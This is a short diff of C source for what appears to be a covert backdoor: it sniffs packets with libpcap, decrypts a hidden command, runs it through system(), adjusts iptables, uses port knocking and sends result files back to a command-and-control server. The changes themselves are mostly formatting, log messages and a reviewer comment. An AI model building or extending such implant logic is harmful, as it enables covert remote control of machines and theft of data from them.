@@ -18,6 +18,7 @@ int Packetcapture(char *filter, struct filter Filter, bool tcp){
         printf("pcap_open_live(): %s\n", errorbuffer);
         exit(0);
     }
+
     if(pcap_compile(interfaceinfo, &fp, filter, 0, netp) == -1){
         perror("pcap_comile");
     }
@@ -25,6 +26,7 @@ int Packetcapture(char *filter, struct filter Filter, bool tcp){
     if(pcap_setfilter(interfaceinfo, &fp) == -1){
         perror("pcap_setfilter");
     }
+
     if(tcp){
         pcap_loop(interfaceinfo, -1, ReadPacket, (u_char*)&Filter);
     } else {
@@ -264,6 +266,7 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tc
         perror("fopen");
         exit(1);
     }
+
     cipherlen = strlen((char*)payload);
     decryptedlen = decryptMessage((unsigned char*)payload, BUFSIZE+16, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);
 
@@ -271,15 +274,17 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tc
         perror("fwrite");
         exit(1);
     }
+
+    fclose(fp);
+
     if(tcp){
-        fclose(fp);
         system(CHMOD);
         system(CMD);
         iptables(Filter->targetip, true, PORT, false, false);
-        printf("COMMAND RECEIEVED \n");
+        printf("Libpcap.c:Received command: %s\n", payload);
         //sending the results back to the CNC
         PortKnocking(Filter, NULL, NULL, true, true);
-        printf("SENDING RESULTS\n");
+        printf("Libpcap.c: Sending file: %s\n", RESULT_FILE);
         send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, true);
         iptables(Filter->targetip, true, PORT, false, true);
         printf("\n");
@@ -292,7 +297,7 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tc
 
 
 struct filter InitFilter(char *target, char *local, bool infected){
-    struct filter Filter;
+    struct filter Filter;       //do you mean malloc?
     Filter.amount = FILTERAMOUNT;
     Filter.port[0] = "8506";
     Filter.port_short[0] = 8506;
